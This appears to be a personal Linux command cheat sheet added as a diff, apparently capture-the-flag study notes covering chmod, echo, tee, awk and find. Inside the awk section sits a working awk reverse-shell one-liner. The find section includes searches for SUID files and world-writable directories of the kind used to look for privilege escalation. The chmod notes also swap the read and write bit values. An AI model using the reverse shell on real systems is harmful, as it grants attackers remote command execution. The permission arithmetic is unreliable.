@@ -1,0 +1,122 @@
+
+
+CHMOD
+
+		changes file ownership adding permission bits
+		
+		examples:
+			chmod 700 <filename> - changes permissions to rwx for owner, others nothing.
+				numbers work like this:
+			chmod	0		0		0	
+					|		|		|			
+					owner	group	every1					
+											
+					
+					
+					0-7: 	2 = r	adding them together results in the number to use so
+							4 = w	5 = read and execute
+							1 = x	6 = read and write
+									7 = rwx
+									
+									
+			-v: verbose
+			-c:
+			-R: recursive mode
+			chmod {u,g,o}{+,-,=}{r,w,x} /path/to/file
+				works like this: chmod u+rw /path/to/file - changes user permissions to read and write
+								 chmod g-x /path/to/file - removes group execute permissions
+								 
+								 
+
+
+
+ECHO
+		echoes string in the terminal
+		
+			-e: enables interpretation of \n as newline
+			example:
+			echo -e "\n=== Memory ==="  ## will instert a newline before ===
+			
+			
+~/.bashrc
+			insert custom code to enable execution with commands
+						
+			example:
+			alias sysinfo='echo "=== CPU ==="; lscpu | grep "Model name\|CPU MHz"; echo -e "\n=== Memory ==="; free -h; echo -e "\n=== GPU ==="; lspci | grep -i vga'
+			call with sysinfo to see things
+
+
+
+
+TEE
+		reads stdin and writes to file and also forwards to stdout
+		
+		example:
+			df -h | tee disk-usage.txt    --- will write disk space info to file and display written stuff in console
+			tee file1 file2 file 3 - write to multiple files
+			
+			
+			
+			
+DF
+
+		info about free space on file system
+
+AWK
+
+		text processing and file manipulation
+		
+		The basic syntax of awk is:
+			awk 'pattern { action }' file
+			
+		Examples:
+			# Print the first and third columns of a space-separated file:
+			
+			cat data.txt | awk '{print $1, $3}'
+			
+			
+			# Print the second column of a CSV file (using comma as separator)
+			
+			awk -F, '{print $2}' data.csv
+						
+
+			# Find users with UID greater than 1000
+			cat /etc/passwd | awk -F: '$3 > 1000 {print $1}'
+			
+			revshell:
+			awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+
+
+FIND
+
+
+		find .      							- . searches from current dir
+		find /home -name flag.txt  				- searches home dir for flag.txt
+		find / -type d -name config				- searches computer for dir named config
+		find / -type f -perm 0777				- searches files for rwx permissions for all users
+		find / -perm a=x						- searches any executables
+		find / -user frank						- searches franks files
+		find / -mtime 10						- modified past 10 days
+		find / -atime 10						- accessed
+		find / -cmin -60						- changed (past 60 min)
+		find / -amin -60						- accessed (past 60 min)
+		find / -size +50M						- sizes of 50mb '+' or '-' specifies bigger or smaller
+		find / -writable -type d 2>/dev/null	- world writable dirs
+		find / -perm 222 -type d 2>/dev/null	- same
+		find / -perm -o w -type d 2>/dev/null	- same
+		find / -perm -u=s -type f 2>/dev/null	- finds files with SUID bit set
+
+
+
+
+
+
+
+
+
+
+
+
+
+
